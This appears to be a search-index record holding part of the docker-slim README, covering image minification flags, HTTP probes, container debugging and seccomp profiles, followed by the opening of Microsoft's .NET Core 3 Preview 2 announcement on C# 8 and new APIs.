EXPOSE instructions for the optimized image --exec - A shell script snippet to run via Docker exec --exec-file - A shell script file to run via Docker exec In the interactive CLI prompt mode you must specify the target image using the --target flag while in the traditional CLI mode you can use the --target flag or you can specify the target image as the last value in the command. The --include-path option is useful if you want to customize your minified image adding extra files and directories. The --include-path-file option allows you to load multiple includes from a newline delimited file. Use this option if you have a lot of includes. The includes from --include-path and --include-path-file are combined together. You can also use the --exclude-pattern flag to control what shouldn't be included. The --continue-after option is useful if you need to script docker-slim. If you pick the probe option then docker-slim will continue executing the build command after the HTTP probe is done executing. If you pick the exec options then docker-slim will continue executing the build command after the container exec shell commands (specified using the --exec-file or --exec flags) are done executing. If you pick the timeout option docker-slim will allow the target container to run for 60 seconds before it will attempt to collect the artifacts. You can specify a custom timeout value by passing a number of seconds you need instead of the timeout string. If you pick the signal option you'll need to send a USR1 signal to the docker-slim process. The signal option is useful when you want to run your own tests against the temporary container docker-slim creates. Your test automation / CI/CD pipeline will be able to notify docker-slim that it's done running its test by sending the USR1 to it. You can also combine multiple continue-after modes. For now only combining probe and exec is supported (using either probe&exec or exec&probe as the --continue-after flag value). Other combinations may work too. Combining probe and signal is not supported. The --include-shell option provides a simple way to keep a basic shell in the minified container. Not all shell commands are included. To get additional shell commands or other command line utilities use the --include-exe and/or --include-bin options. Note that the extra apps and binaries might missed some of the non-binary dependencies (which don't get picked up during static analysis). For those additional dependencies use the --include-path and --include-path-file options. The --dockerfile option makes it possible to build a new minified image directly from source Dockerfile. Pass the Dockerfile name as the value for this flag and pass the build context directory or URL instead of the docker image name as the last parameter for the docker-slim build command: docker-slim build --dockerfile Dockerfile --tag my/custom_minified_image_name . If you want to see the console output from the build stages (when the fat and slim images are built) add the --show-blogs build flag. Note that the build console output is not interactive and it's printed only after the corresponding build step is done. The fat image created during the build process has the .fat suffix in its name. If you specify a custom image tag (with the --tag flag) the .fat suffix is added to the name part of the tag. If you don't provide a custom tag the generated fat image name will have the following format: docker-slim-tmp-fat-image.<pid_of_docker-slim>.<current_timestamp>. The minified image name will have the .slim suffix added to that auto-generated container image name (docker-slim-tmp-fat-image.<pid_of_docker-slim>.<current_timestamp>.slim). Take a look at this python examples to see how it's using the --dockerfile flag. The --use-local-mounts option is used to choose how the docker-slim sensor is added to the target container and how the sensor artifacts are delivered back to the master. If you enable this option you'll get the original docker-slim behavior where it uses local file system volume mounts to add the sensor executable and to extract the artifacts from the target container. This option doesn't always work as expected in the dockerized environment where docker-slim itself is running in a Docker container. When this option is disabled (default behavior) then a separate Docker volume is used to mount the sensor and the sensor artifacts are explicitly copied from the target container. RUNNING CONTAINERIZED The current version of docker-slim is able to run in containers. It will try to detect if it's running in a containerized environment, but you can also tell docker-slim explicitly using the --in-container global flag. You can run docker-slim in your container directly or you can use the docker-slim container in your containerized environment. If you are using the docker-slim container make sure you run it configured with the Docker IPC information, so it can communicate with the Docker daemon. The most common way to do it is by mounting the Docker unix socket to the docker-slim container. Some containerized environments (like Gitlab and their dind service) might not expose the Docker unix socket to you, so you'll need to make sure the environment variables used to communicate with Docker (e.g., DOCKER_HOST) are passed to the docker-slim container. Note that if those environment variables reference any kind of local host names those names need to be replaced or you need to tell docker-slim about them using the --etc-hosts-map flag. If those environment variables reference local files those local files (e.g., files for TLS cert validation) will need to be copied to a temporary container, so that temporary container can be used as a data container to make those files accessible by the docker-slim container. When docker-slim runs in a container it will attempt to save its execution state in a separate Docker volume. If the volume doesn't exist it will try to create it (docker-slim-state, by default). You can pick a different state volume or disable this behavior completely by using the global --archive-state flag. If you do want to persist the docker-slim execution state (which includes the seccomp and AppArmor profiles) without using the state archiving feature you can mount your own volume that maps to the /bin/.docker-slim-state directory in the docker-slim container. By default, docker-slim will try to create a Docker volume for its sensor unless one already exists. If this behavior is not supported by your containerized environment you can create a volume separately and pass its name to docker-slim using the --use-sensor-volume flag. Here's a basic example of how to use the containerized version of docker-slim: docker run -it --rm -v /var/run/docker.sock:/var/run/docker.sock dslim/docker-slim build your-docker-image-name Here's a GitLab example for their dind .gitlab-ci.yml config file: docker run -e DOCKER_HOST=tcp://$(grep docker /etc/hosts | cut -f1):2375 dslim/docker-slim build your-docker-image-name Here's a CircleCI example for their remote docker .circleci/config.yml config file (used after the setup_remote_docker step): docker create -v /dcert_path --name dcert alpine:latest /bin/true docker cp $DOCKER_CERT_PATH/. dcert:/dcert_path docker run --volumes-from dcert -e DOCKER_HOST=$DOCKER_HOST -e DOCKER_TLS_VERIFY=$DOCKER_TLS_VERIFY -e DOCKER_CERT_PATH=/dcert_path dslim/docker-slim build your-docker-image-name DOCKER CONNECT OPTIONS If you don't specify any Docker connect options docker-slim expects to find the following environment variables: DOCKER_HOST, DOCKER_TLS_VERIFY (optional), DOCKER_CERT_PATH (required if DOCKER_TLS_VERIFY is set to \"1\") On Mac OS X you get them when you run eval \"$(docker-machine env default)\" or when you use the Docker Quickstart Terminal. If the Docker environment variables are configured to use TLS and to verify the Docker cert (default behavior), but you want to disable the TLS verification you can override the TLS verification behavior by setting the --tls-verify to false: docker-slim --tls-verify=false build my/sample-node-app-multi You can override all Docker connection options using these flags: --host, --tls, --tls-verify, --tls-cert-path. These flags correspond to the standard Docker options (and the environment variables). If you want to use TLS with verification: docker-slim --host=tcp://192.168.99.100:2376 --tls-cert-path=/Users/youruser/.docker/machine/machines/default --tls=true --tls-verify=true build my/sample-node-app-multi If you want to use TLS without verification: docker-slim --host=tcp://192.168.99.100:2376 --tls-cert-path=/Users/youruser/.docker/machine/machines/default --tls=true --tls-verify=false build my/sample-node-app-multi If the Docker environment variables are not set and if you don't specify any Docker connect options docker-slim will try to use the default unix socket. HTTP PROBE COMMANDS If the HTTP probe is enabled (note: it is enabled by default) it will default to running GET / with HTTP and then HTTPS on every exposed port. You can add additional commands using the --http-probe-cmd and --http-probe-cmd-file options. If you want to disable HTTP probing set the --http-probe flag to false (e.g., --http-probe=false). You can also use the --http-probe-off flag to do the same (simply use the flag without any parameters). The --http-probe-cmd option is good when you want to specify a small number of simple commands where you select some or all of these HTTP command options: crawling (defaults to false), protocol, method (defaults to GET), resource (path and query string). If you only want to use custom HTTP probe command and you don't want the default GET / command added to the command list you explicitly provided you'll need to set --http-probe to false when you specify your custom HTTP probe command. Note that this inconsistency will be addressed in the future releases to make it less confusing. Possible field combinations: /path - runs GET /path crawl:/path - runs GET /path and then crawls the pages referenced by the target page post:/path - runs POST /path crawl:get:/path - runs GET /path and then crawls the pages referenced by the target page https:get:/path runs GET /path only on https crawl:http:get:/path - runs GET /path and then crawls the pages referenced by the target page Here are a couple of examples: Adds two extra probe commands: GET /api/info and POST /submit (tries http first, then tries https): docker-slim build --show-clogs --http-probe-cmd /api/info --http-probe-cmd POST:/submit my/sample-node-app-multi Adds one extra probe command: POST /submit (using only http): docker-slim build --show-clogs --http-probe-cmd http:POST:/submit my/sample-node-app-multi The --http-probe-cmd-file option is good when you have a lot of commands and/or you want to select additional HTTP command options. Available HTTP command options: method - HTTP method to use resource - target resource URL port - port number protocol - http, https, http2, http2c (cleartext version of http2), ws, wss (secure websocket) headers - array of strings with column delimited key/value pairs (e.g., \"Content-Type: application/json\") body - request body as a string body_file - request body loaded from the provided file username - username to use for basic auth password - password to use for basic auth crawl - boolean to indicate if you want to crawl the target (to visit all referenced resources) Here's a probe command file example: docker-slim build --show-clogs --http-probe-cmd-file probeCmds.json my/sample-node-app-multi Commands in probeCmds.json: { \"commands\": [ { \"resource\": \"/api/info\" }, { \"method\": \"POST\", \"resource\": \"/submit\" }, { \"procotol\": \"http\", \"resource\": \"/api/call?arg=one\" }, { \"protocol\": \"http\", \"method\": \"POST\", \"resource\": \"/submit2\", \"body\": \"key=value\" }, { \"protocol\": \"http\", \"method\": \"POST\", \"resource\": \"/submit3\", \"body_file\": \"mydata.json\", \"headers\": [\"Content-Type: application/json\"] } ] } The HTTP probe command file path can be a relative path (relative to the current working directory) or it can be an absolute path. For each HTTP probe call docker-slim will print the call status. Example: info=http.probe.call status=200 method=GET target=http://127.0.0.1:32899/ attempt=1 error=none. You can execute your own external HTTP requests using the target.port.list field in the container info message docker-slim prints when it starts its test container: docker-slim[build]: info=container name=<your_container_name> id=<your_container_id> target.port.list=[<comma_separated_list_of_port_numbers_to_use>] target.port.info=[<comma_separated_list_of_port_mapping_records>]. Example: docker-slim[build]: info=container name=dockerslimk_42861_20190203084955 id=aa44c43bcf4dd0dae78e2a8b3ac011e7beb6f098a65b09c8bce4a91dc2ff8427 target.port.list=[32899] target.port.info=[9000/tcp => 0.0.0.0:32899]. With this information you can run curl or other HTTP request generating tools: curl http://localhost:32899. The current version also includes an experimental crawling capability. To enable it for the default HTTP probe use the --http-probe-crawl flag. You can also enable it for the HTTP probe commands in your command file using the crawl boolean field. When crawling is enabled the HTTP probe will act like a web crawler following the links it finds in the target endpoint. Probing based on the Swagger/OpenAPI spec is another experimental capability. This feature introduces two new flags: http-probe-apispec - value: <path_to_fetch_spec>:<api_endpoint_prefix> http-probe-apispec-file - value: <local_file_path_to_spec> You can use the --http-probe-exec and --http-probe-exec-file options to run the user provided commands when the http probes are executed. This example shows how you can run curl against the temporary docker-slim created container when the http probes are executed. docker-slim build --http-probe-exec 'curl http://localhost:YOUR_CONTAINER_PORT_NUM/some/path' --publish-port YOUR_CONTAINER_PORT_NUM your-container-image-name DEBUGGING MINIFIED CONTAINERS You can create dedicated debugging side-car container images loaded with the tools you need for debugging target containers. This allows you to keep your production container images small. The debugging side-car containers attach to the running target containers. Assuming you have a running container named node_app_alpine you can attach your debugging side-car with a command like this: docker run --rm -it --pid=container:node_app_alpine --net=container:node_app_alpine --cap-add sys_admin alpine sh. In this example, the debugging side-car is a regular alphine image. This is exactly what happens with the node_alpine app sample (located in the node_alpine directory of the examples repo) and the run_debug_sidecar.command helper script. If you run the ps command in the side-car you'll see the application from the target container: # ps PID USER TIME COMMAND 1 root 0:00 node /opt/my/service/server.js 13 root 0:00 sh 38 root 0:00 ps You can access the target container file system through /proc/<TARGET_PID>/root: # ls -lh /proc/1/root/opt/my/service total 8 drwxr-xr-x 3 root root 4.0K Sep 2 15:51 node_modules -rwxr-xr-x 1 root root 415 Sep 8 00:52 server.js Some of the useful debugging commands include cat /proc/<TARGET_PID>/cmdline, ls -l /proc/<TARGET_PID>/cwd, cat /proc/1/environ, cat /proc/<TARGET_PID>/limits, cat /proc/<TARGET_PID>/status and ls -l /proc/<TARGET_PID>/fd. MINIFYING COMMAND LINE TOOLS Unless the default CMD instruction in your Dockerfile is sufficient you'll have to specify command line parameters when you execute the build command in DockerSlim. This can be done with the --cmd option. Other useful command line parameters: --show-clogs - use it if you want to see the output of your container. --mount - use it to mount a volume when DockerSlim inspects your image. --entrypoint - use it if you want to override the ENTRYPOINT instruction when DockerSlim inspects your image. Note that the --entrypoint and --cmd options don't override the ENTRYPOINT and CMD instructions in the final minified image. Here's a sample build command: docker-slim build --show-clogs=true --cmd docker-compose.yml --mount $(pwd)/data/:/data/ dslim/container-transform It's used to minify the container-transform tool. You can get the minified image from Docker Hub. QUICK SECCOMP EXAMPLE If you want to auto-generate a Seccomp profile AND minify your image use the build command. If you only want to auto-generate a Seccomp profile (along with other interesting image metadata) use the profile command. Step one: run DockerSlim docker-slim build your-name/your-app Step two: use the generated Seccomp profile docker run --security-opt seccomp:<docker-slim directory>/.images/<YOUR_APP_IMAGE_ID>/artifacts/your-name-your-app-seccomp.json <your other run params> your-name/your-app Feel free to copy the generated profile :-) You can use the generated Seccomp profile with your original image or with the minified image. USING AUTO-GENERATED SECCOMP PROFILES You can use the generated profile with your original image or with the minified image DockerSlim created: docker run -it --rm --security-opt seccomp:path_to/my-sample-node-app-seccomp.json -p 8000:8000 my/sample-node-app.slim ORIGINAL DEMO VIDEO Demo video on YouTube DEMO STEPS The demo runs on Mac OS X, but you can build a linux version. Note that these steps are different from the steps in the demo video. Get the docker-slim Mac, Mac M1, Linux, Linux ARM or Linux ARM64 binaries. Unzip them and optionally add their directory to your PATH environment variable if you want to use the app from other locations. The extracted directory contains two binaries: docker-slim <- the main application docker-slim-sensor <- the sensor application used to collect information from running containers Clone the examples repo to use the sample apps (note: the examples have been moved to a separate repo). You can skip this step if you have your own app. git clone https://github.com/docker-slim/examples.git Create a Docker image for the sample node.js app in examples/node_ubuntu. You can skip this step if you have your own app. cd examples/node_ubuntu eval \"$(docker-machine env default)\" <- optional (depends on how Docker is installed on your machine and what kind of Docker version you are using); if the Docker host is not running you'll need to start it first: docker-machine start default; see the Docker connect options section for more details. docker build -t my/sample-node-app . Run docker-slim: ./docker-slim build my/sample-node-app <- run it from the location where you extraced the docker-slim binaries (or update your PATH env var to include the docker-slim bin directory) DockerSlim creates a special container based on the target image you provided. It also creates a resource directory where it stores the information it discovers about your image: <docker-slim directory>/.images/<TARGET_IMAGE_ID>. By default, docker-slim will run its http probe against the temporary container. If you are minifying a command line tool that doesn't expose any web service interface you'll need to explicitly disable http probing (by setting --http-probe=false). Use curl (or other tools) to call the sample app (optional) curl http://<YOUR_DOCKER_HOST_IP>:<PORT> This is an optional step to make sure the target app container is doing something. Depending on the application it's an optional step. For some applications it's required if it loads new application resources dynamically based on the requests it's processing (e.g., Ruby or Python). You'll see the mapped ports printed to the console when docker-slim starts the target container. You can also get the port number either from the docker ps or docker port <CONTAINER_ID> commands. The current version of DockerSlim doesn't allow you to map exposed network ports (it works like docker run -P). Press and wait until docker-slim says it's done By default or when http probing is enabled explicitly docker-slim will continue its execution once the http probe is done running. If you explicitly picked a different continue-after option follow the expected steps. For example, for the enter continue-after option you must press the enter button on your keyboard. If http probing is enabled (when http-probe is set) and if continue-after is set to enter and you press the enter key before the built-in HTTP probe is done the probe might produce an EOF error because docker-slim will shut down the target container before all probe commands are done executing. It's ok to ignore it unless you really need the probe to finish. Once DockerSlim is done check that the new minified image is there docker images You should see my/sample-node-app.slim in the list of images. Right now all generated images have .slim at the end of its name. Use the minified image docker run -it --rm --name=\"slim_node_app\" -p 8000:8000 my/sample-node-app.slim FAQ Is it safe for production use? Yes! Either way, you should test your Docker images. How can I contribute if I don't know Go? You don't need to read the language spec and lots of books :-) Go through the Tour of Go and optionally read 50 Shades of Go and you'll be ready to contribute! What's the best application for DockerSlim? DockerSlim will work for any dockerized application; however, DockerSlim automates app interactions for applications with an HTTP API. You can use DockerSlim even if your app doesn't have an HTTP API. You'll need to interact with your application manually to make sure DockerSlim can observe your application behavior. Can I use DockerSlim with dockerized command line tools? Yes. The --cmd, --entrypoint, and --mount options will help you minify your image. The container-transform tool is a good example. Notes: You can explore the artifacts DockerSlim generates when it's creating a slim image. You'll find those in <docker-slim directory>/.images/<TARGET_IMAGE_ID>/artifacts. One of the artifacts is a \"reverse engineered\" Dockerfile for the original image. It'll be called Dockerfile.fat. If you'd like to see the artifacts without running docker-slim you can take a look at the examples/artifacts directory in this repo. It doesn't include any image files, but you'll find: a reverse engineered Dockerfile (Dockerfile.fat) a container report file (creport.json) a sample AppArmor profile (which will be named based on your original image name) and a sample Seccomp profile If you don't want to create a minified image and only want to \"reverse engineer\" the Dockerfile you can use the info command. What if my Docker images uses the USER command? The current version of DockerSlim does include support for non-default users (take a look at the non-default user examples (including the ElasticSearch example located in the 3rdparty directory) in the examples repo. Please open tickets if something doesn't work for you. Everything should work as-is, but for the special cases where the current behavior don't work as expected you can adjust what DockerSlim does using various build command parameters: --run-target-as-user, --keep-perms, --path-perms, --path-perms-file (along with the --include-* parameters). The --run-target-as-user parameter is enabled by default and it controls if the application in the temporary container is started using the identity from the USER instruction in the container's Dockerfile. The --keep-perms parameter is also enabled by default. It tells DockerSlim to retain the permissions and the ownership information for the files and directories copied to the optimized container image. The --path-perms and --path-perms-file parameters are similar to the --include-path and --include-path-file parameters. They are used to overwrite the permission and the user/group information for the target files and directories. Note that the target files/directories are expected to be in the optimized container image. If you don't know if the target files/directories will be in the optimized container you'll need to use one of the --include-* parameters (e.g., --include-path-file) to explicitly require those artifacts to be included. You can specify the permissions and the ownership information in the --include-* parameters too (so you don't need to have the --path-* parameters just to set the permissions). The --path-* and --include-* params use the same format to communicate the permission/owernship info: TARGET_PATH_OR_NAME:PERMS_IN_OCTAL_FORMAT#USER_ID#GROUP_ID. You don't have to specify the user and group IDs if you don't want to change them. Here's an example using these parameters to minify the standard nginx image adding extra artifacts and changing their permissions: docker-slim build --include-path='/opt:770#104#107' --include-path='/bin/uname:710' --path-perms='/tmp:700' nginx. This is what you'll see in the optimized container image: drwx------ 0 0 0 0 Feb 28 22:15 tmp/ -rwx--x--- 0 0 0 31240 Mar 14 2015 bin/uname drwxrwx--- 0 104 107 0 Feb 28 22:13 opt/ The uname binary isn't used by nginx, so the --include-path parameter is used to keep it in the optimized image changing its permissions to 710. The /tmp directory will be included in the optimized image on its own, so the --path-perms parameter is used to change its permissions to 700. When you set permissions/user/group on a directory the settings are only applied to that directory and not to the artifacts inside. The future versions will allow you to apply the same settings to everything inside the target directory too. Also note that for now you have to use numeric user and group IDs. The future versions will allow you to use user and group names too. Nginx fails in my minified image If you see nginx: [emerg] mkdir() \"/var/lib/nginx/body\" failed it means your nginx setup uses a non-standard temporary directory. Nginx will fail if the base directory for its temporary folders doesn't exist (they won't create the missing intermediate directories). Normally it's /var/lib/nginx, but if you have a custom config that points to something else you'll need to add an --include-path flag as an extra flag when you run docker-slim. DockerSlim fails with a 'no permission to read from' error You can get around this problem by running DockerSlim from a root shell. That way it will have access to all exported files. DockerSlim copies the relevant image artifacts trying to preserve their permissions. If the permissions are too restrictive the master app might not have sufficient priviledge to access these files when it's building the new minified image. BUILD PROCESS Build Options Pick one of the build options that works best for you. Containerized Run make (or ./scripts/docker-builder.run.sh or click on ./scripts/mac/docker-builder.run.command on Macs) from the project directory (builds docker-slim in a Docker container; great if you don't want to install Go on your local machine and if you already have Docker). Native Run make build (or ./scripts/src.build.sh or click on ./scripts/mac/src.build.command on Macs) to build docker-slim natively (requires Go installed locally). Note: Use Go 1.13 or higher. You can use earlier version of Go, but it can't be lower than Go 1.5.1. Versions prior to 1.5.1 have a Docker/ptrace related bug (Go kills processes if your app is PID 1). When the 'monitor' is separate from the 'launcher' process it will be possible to user older Go versions again. Gitpod If you have a web browser, you can get a fully pre-configured development environment in one click: Additional Tools license-bill-of-materials - Optional tool to track dependencies and their licenses. golint - Optional tool for code analysis. See https://github.com/golang/lint for more details. You can install these tools using the tools.get.sh shell script in the scripts directory. Notes: Make sure you have golint if you intend to run the src.inspect.sh or mac.src.inspect.command scripts. CONTRIBUTING If the project sounds interesting or if you found a bug see CONTRIBUTING.md and submit a PR! DESIGN CORE CONCEPTS Inspect container metadata (static analysis) Inspect container data (static analysis) Inspect running application (dynamic analysis) Build an application artifact graph Use the collected application data to build small images Use the collected application data to auto-generate various security framework configurations. DYNAMIC ANALYSIS OPTIONS Instrument the container image (and replace the entrypoint/cmd) to collect application activity data Use kernel-level tools that provide visibility into running containers (without instrumenting the containers) Disable relevant namespaces in the target container to gain container visibility (can be done with runC) SECURITY The goal is to auto-generate Seccomp, AppArmor, (and potentially SELinux) profiles based on the collected information. AppArmor profiles Seccomp profiles CHALLENGES Some of the advanced analysis options require a number of Linux kernel features that are not always included. The kernel you get with Docker Machine / Boot2docker is a great example of that. DEVELOPMENT PROGRESS TODO AppArmor profile improvements Better support for command line applications (e.g., ability to specify multiple executions) Discover HTTP endpoints to make the HTTP probe more intelligent. Scripting language dependency discovery in the \"scanner\" app. Explore additional dependency discovery methods. \"Live\" image create mode - to create new images from containers where users install their applications interactively. The WISHLIST doc includes even more potential improvements. ORIGINS DockerSlim was a Docker Global Hack Day #dockerhackday project. It barely worked at the time, but it did get a win in Seattle and it took the second place in the Plumbing category overall :-) Since then it's been improved and it works pretty well for its core use cases. It can be better though. That's why the project needs your help! You don't need to know much about Docker and you don't need to know anything about Go. You can contribute in many different ways. For example, use DockerSlim on your images and open a Github issue documenting your experience even if it worked just fine :-) MINIFIED DOCKER HUB IMAGES container-transform LICENSE Apache License v2, see LICENSE for details. ",
        "_version_": 1718527439758426113
      },
      {
        "story_id": [19032439],
        "story_author": ["WalterSobchak"],
        "story_descendants": [2],
        "story_score": [21],
        "story_time": ["2019-01-30T03:40:28Z"],
        "story_title": "Announcing .NET Core 3 Preview 2",
        "search": [
          "Announcing .NET Core 3 Preview 2",
          "https://blogs.msdn.microsoft.com/dotnet/2019/01/29/announcing-net-core-3-preview-2/",
          "Richard January 29th, 2019 Today, we are announcing .NET Core 3 Preview 2. It includes new features in .NET Core 3.0 and C# 8, in addition to the large number of new features in Preview 1. ASP.NET Core 3.0 Preview 2 is alsoreleased today. C# 8 Preview 2 is part of .NET Core 3 SDK, and was also released last week with Visual Studio 2019 Preview 2. Download and get started with .NET Core 3 Preview 2 right now on Windows, macOS and Linux. In case you missed it, we made some big announcements with Preview 1, including adding support for Windows Forms and WPF with .NET Core, on Windows, and that both UI frameworks will be open source. We also announced that we would support Entity Framework 6 on .NET Core, which will come in a later preview. ASP.NET Core is also adding many features including Razor components. Please provide feedback on the release in the comments below or at dotnet/core #2263. You can see complete details of the release in the .NET Core 3 Preview 2 release notes. .NET Core 3 will be supported in Visual Studio 2019, Visual Studio for Mac and Visual Studio Code. Visual Studio 2019 Preview 2 was released last week and has support for C# 8. The Visual Studio Code C# Extension (in pre-release channel) was also just updated to support C# 8. C# 8 C# 8 is a major release of the language, as Mads describes in Do more with patterns in C# 8.0, Take C# 8.0 for a spin and Building C# 8.0. In this post, Ill cover a few favorites that are new in Preview 2. Using Declarations Are you tired of using statements that require indenting your code? No more! You can now write the following code, which attaches a using declaration to the scope of the current statement block and then disposes the object at the end of it. Switch Expressions Anyone who uses C# probably loves the idea of a switch statement, but not the syntax. C# 8 introduces switch expressions, which enable the following: terser syntax, returns a value since it is an expression, and fully integrated with pattern matching. The switch keyword is infix, meaning the keyword sits between the tested value (here, thats o) and the list of cases, much like expression lambdas. The following examples use the lambda syntax for methods, which integrates well with switch expressions but isnt required. You can see the syntax for switch expressions in the following example: There are two patterns at play in this example. o first matches with the Point type pattern and then with the property pattern inside the {curly braces}. The _ describes the discard pattern, which is the same as default for switch statements. You can go one step further, and rely on tuple deconstruction and parameter position, as you can see in the following example: In this example, you can see you do not need to define a variable or explicit type for each of the cases. Instead, the compiler can match the tuple being testing with the tuples defined for each of the cases. All of these patterns enable you to write declarative code that captures your intent instead of procedural code that implements tests for it. The compiler becomes responsible for implementing that boring procedural code and is guaranteed to always do it correctly. There will still be cases where switch statements will be a better choice than switch expressions and patterns can be used with both syntax styles. Async streams Async streams are another major improvement in C# 8. They have been changing with each preview and require that the compiler and the framework libraries match to work correctly. You need .NET Core 3.0 Preview 2 to use async streams if you want to develop with either Visual Studio 2019 Preview 2 or the latest preview of the C# extension for Visual Studio Code. If you are using .NET Core 3.0 Preview 2 at the commandline, then everything will work as expected. IEEE Floating-point improvements Floating point APIs are in the process of being updated to comply with IEEE 754-2008 revision. The goal of this floating point project is to expose all required operations and ensure that they are behaviorly compliant with the IEEE spec. Parsing and formatting fixes: Correctly parse and round inputs of any length. Correctly parse and format negative zero. Correctly parse Infinity and NaN by performing a case-insensitive check and allowing an optional preceding + where applicable. New Math APIs: BitIncrement/BitDecrement corresponds to the nextUp and nextDown IEEE operations. They return the smallest floating-point number that compares greater or lesser than the input (respectively). For example, Math.BitIncrement(0.0) would return double.Epsilon. MaxMagnitude/MinMagnitude corresponds to the maxNumMag and minNumMag IEEE operations, they return the value that is greater or lesser in magnitude of the two inputs (respectively). For example, Math.MaxMagnitude(2.0, -3.0) would return -3.0. ILogB corresponds to the logB IEEE operation which returns an integral value, it returns the integral base-2 log of the input parameter. This is effectively the same as floor(log2(x)), but done with minimal rounding error. ScaleB corresponds to the scaleB IEEE operation which takes an integral value, it returns effectively x * pow(2, n), but is done with minimal rounding error. Log2 corresponds to the log2 IEEE operation, it returns the base-2 logarithm. It minimizes rounding error. FusedMultiplyAdd corresponds to the fma IEEE operation, it performs a fused multiply add. That is, it does (x * y) + z as a single operation, there-by minimizing the rounding error. An example would be FusedMultiplyAdd(1e308, 2.0, -1e308) which returns 1e308. The regular (1e308 * 2.0) - 1e308 returns double.PositiveInfinity. CopySign corresponds to the copySign IEEE operation, it returns the value of x, but with the sign of y. .NET Platform Dependent Intrinsics Weve added APIs that allow access to certain perf-oriented CPU instructions, such as the SIMD or Bit Manipulation instruction sets. These instructions can help achieve big performance improvements in certain scenarios, such as processing data efficiently in parallel. In addition to exposing the APIs for your programs to use, we have begun using these instructions to accelerate the .NET libraries too. The following CoreCLR PRs demonstrate a few of the intrinsics, either via implementation or use: Implement simple SSE2 hardware instrinsics Implement the SSE hardware intrinsics Arm64 Base HW Intrinsics Use TZCNT and LZCNT for Locate{First|Last}Found{Byte|Char} For more information, take a look at .NET Platform Dependent Intrinsics, which defines an approach for defining this hardware infrastructure, allowing Microsoft, chip vendors or any other company or individual to define hardware/chip APIs that should be exposed to .NET code. Introducing a fast in-box JSON Writer & JSON Document Following the introduction of the JSON reader in preview1, weve added System.Text.Json.Utf8JsonWriter and System.Text.Json.JsonDocument. As described in our System.Text.Json roadmap, we plan to provide a POCO serializer and deserializer next. Utf8JsonWriter The Utf8JsonWriter provides a high-performance, non-cached, forward-only way to write UTF-8 encoded JSON text from common .NET types like String, Int32, and DateTime. Like the reader, the writer is a foundational, low-level type, that can be leveraged to build custom serializers. Writing a JSON payload using the new Utf8JsonWriter is 30-80% faster than using the writer from Json.NET and does not allocate. Here is a sample usage of the Utf8JsonWriter that can be used as a starting point: The Utf8JsonWriter accepts IBufferWriter<byte> as the output location to synchronously write the json data into and you, as the caller, need to provide a concrete implementation. The platform does not currently include an implementation of this interface, but we plan to provide one that is backed by a resizable byte array. That implementation would enable synchronous writes, which could then be copied to any stream (either synchronously or asynchronously). If you are writing JSON over the network and include the System.IO.Pipelines package, you can leverage the Pipe-based implementation of the interface called PipeWriter to skip the need to copy the JSON from an intermediary buffer to the actual output. You can take inspiration from this sample implementation of IBufferWriter<T>. The following is a skeleton array-backed concrete implementation of the interface: JsonDocument In preview2, weve also added System.Text.Json.JsonDocument which was built on top of the Utf8JsonReader. The JsonDocument provides the ability to parse JSON data and build a read-only Document Object Model (DOM) that can be queried to support random access and enumeration. The JSON elements that compose the data can be accessed via the JsonElement type which is exposed by the JsonDocument as a property called RootElement. The JsonElement contains the JSON array and object enumerators along with APIs to convert JSON text to common .NET types. Parsing a typical JSON payload and accessing all its members using the JsonDocument is 2-3x faster than Json.NET with very little allocations for data that is reasonably sized (i.e. < 1 MB). Here is a sample usage of the JsonDocument and JsonElement that can be used as a starting point: GPIO Support for Raspberry Pi We added initial support for GPIO with Preview 1. As part of Preview 2, we have released two NuGet packages that you can use for GPIO programming. System.Device.Gpio Iot.Device.Bindings The GPIO Packages includes APIs for GPIO, SPI, I2C and PWM devices. The IoT bindings package includes device bindings for various chips and sensors, the same ones available at dotnet/iot src/devices. Updated serial port APIs were announced as part of Preview 1. They are not part of these packages but are available as part of the .NET Core platform. Local dotnet tools Local dotnet tools have been improved in Preview 2. Local tools are similar to dotnet global tools but are associated with a particular location on disk. This enables per-project and per-repository tooling. You can read more about them in the .NET Core 3.0 Preview 1 post. In this preview, we have added 2 new commands: dotnet new tool-manifest dotnet tool list To add local tools, you need to add a manifest that will define the tools and versions available. The dotnet new tool-manifest command automates creation of the manifest required by local tools. After this file is created, you can add tools to it via dotnet tool install <packageId>. The command dotnet tool list lists local tools and their corresponding manifest. The command dotnet tool list -g lists global tools. There was a change in .NET Core Local Tools between .NET Core 3.0 Preview 1 and .NET Core 3.0 Preview 2. If you tried out local tools in Preview 1 by running a command like dotnet tool restore or dotnet tool install, you need to delete your local tools cache folder before local tools will work correctly in Preview 2. This folder is located at: On mac, Linux: rm -r $HOME/.dotnet/toolResolverCache On Windows: rmdir /s %USERPROFILE%\\.dotnet\\toolResolverCache If you do not delete this folder, you will receive an error. Assembly Unloadability Assembly unloadability is a new capability of AssemblyLoaderContext. This new feature is largely transparent from an API perspective, exposed with just a few new APIs. It enables a loader context to be unloaded, releasing all memory for instantiated types, static fields and for the assembly itself. An application should be able to load and unload assemblies via this mechanism forever without experiencing a memory leak. We expect this new capability to be used for the following scenarios: Plugin scenarios where dynamic plugin loading and unloading is required. Dynamically compiling, running and then flushing code. Useful for web sites, scripting engines, etc. Loading assemblies for introspection (like ReflectionOnlyLoad), although MetadataLoadContext (released in Preview 1) will be a better choice in many cases. More information: Design doc Using Unloadability doc Assembly unloading requires significant care to ensure that all references to managed objects from outside a loader context are understood and managed. When the loader context is requested to be unloaded, any outside references need to have been unreferenced so that the loader context is self-consistent only to itself. Assembly unloadability was provided in the .NET Framework by Application Domains (AppDomains), which are not supported with .NET Core. AppDomains had both benefits and limitations compared to this new model. We consider this new loader context-based model to be more flexible and higher performance when compared to AppDomains. Windows Native Interop Windows offers a rich native API, in the form of flat C APIs, COM and WinRT. Weve had support for P/Invoke since .NET Core 1.0, and have been adding the ability to CoCreate COM APIs and Activate WinRT APIs as part of the .NET Core 3.0 release. We have had many requests for these capabilities, so we know that they will get a lot of use. Late last year, we announced that we had managed to automate Excel from .NET Core. That was a fun moment. You can now try this same demo yourself with the Excel demo sample. Under the covers, this demo is using COM interop features like NOPIA, object equivalence and custom marshallers. Managed C++ and WinRT interop are coming in a later preview. We prioritized getting COM interop built first. WPF and Windows Forms The WPF and Windows Forms teams opened up their repositories, dotnet/wpf and dotnet/winforms, respectively, on December 4th, the same day .NET Core 3.0 Preview 1 was released. Much of the last month, beyond holidays, has been spent interacting with the community, merging PRs, and responding to issues. In the background, theyve been integrating WPF and Windows Forms into the .NET Core build system, including adopting the Arcade SDK. Arcade is an MSBuild SDK that exposes functionality which is needed to build the .NET Platform. The WPF team will be publishing more of the WPF source code over 